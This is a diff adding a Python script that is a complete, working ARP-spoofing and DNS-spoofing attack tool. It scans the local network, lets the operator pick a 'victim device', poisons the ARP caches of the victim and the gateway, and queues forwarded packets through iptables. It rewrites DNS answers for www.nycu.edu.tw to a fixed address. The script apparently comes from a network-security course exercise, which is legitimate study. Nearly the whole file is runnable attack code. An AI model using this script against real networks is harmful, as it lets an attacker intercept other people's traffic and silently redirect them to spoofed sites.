@@ -1,0 +1,81 @@
+#!/usr/bin/env python3
+from scapy.all import *
+import netifaces
+import os
+import sys
+import time
+import netfilterqueue
+
+def scan_all_devices():
+    gateway_ip, iface = netifaces.gateways()['default'][netifaces.AF_INET]
+    iface_info = netifaces.ifaddresses(iface)
+    mask = iface_info[netifaces.AF_INET][0]['netmask']
+    my_ip = iface_info[netifaces.AF_INET][0]['addr']
+    my_mac = iface_info[netifaces.AF_LINK][0]['addr']
+    ans, unans = arping(gateway_ip+'/24', verbose=False)
+    print("MAC                 IP")
+    print("--------------------------")
+    ans.summary(lambda s,r: r.sprintf("%Ether.src%   %ARP.psrc%"))
+    print()
+    li=[]
+    gateway_mac = ""
+    for s,r in ans:
+        li.append((r.hwsrc, r.psrc))
+        if(r.psrc == gateway_ip):
+            gateway_mac = r.hwsrc
+    return my_ip, my_mac, gateway_ip, gateway_mac, li
+
+def spoof(target_ip, target_mac, spoof_ip):
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
+
+def restore(dst_ip, dst_mac, src_ip, src_mac):
+    packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
+    send(packet, count=4, verbose=False)
+
+def process_pkt(packet):
+    pkt = IP(packet.get_payload())
+    if pkt.haslayer(DNSRR):
+        qname = pkt[DNSQR].qname
+        if b"www.nycu.edu.tw" in qname: #target website
+            print(pkt.show())
+            ans = DNSRR(rrname=qname, rdata="140.113.207.246")
+            pkt[DNS].an = ans
+            pkt[DNS].ancount = 1
+            del pkt[IP].len
+            del pkt[IP].chksum
+            del pkt[UDP].chksum
+            del pkt[UDP].len
+            packet.set_payload(bytes(pkt)) #modify finish
+    packet.accept()
+
+if __name__ == '__main__':
+    ip, mac, router_ip, router_mac, devices = scan_all_devices()
+    for i in range(len(devices)):
+        print(str(i) + ': ' + str(devices[i]))
+
+    c = int(input('choose victim device: '))
+    print('Using ' + str(devices[c]))
+    target_mac ,target_ip = devices[c][0], devices[c][1]
+    
+    try:
+        pid = os.fork()
+        if pid == 0:
+            while(True):
+                spoof(target_ip, target_mac, router_ip) #spoof victim
+                spoof(router_ip, router_mac, target_ip) #spoof router
+                time.sleep(2)
+        else:
+            os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
+            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+            queue = netfilterqueue.NetfilterQueue()
+            queue.bind(0, process_pkt)
+            queue.run()
+    except KeyboardInterrupt:
+        print('Restoring router and victim MAC table...')
+        restore(target_ip, target_mac, router_ip, router_mac) #restore victim
+        restore(router_ip, router_mac, target_ip, target_mac) #restore router
+        os.system("iptables --flush")
+
+
+
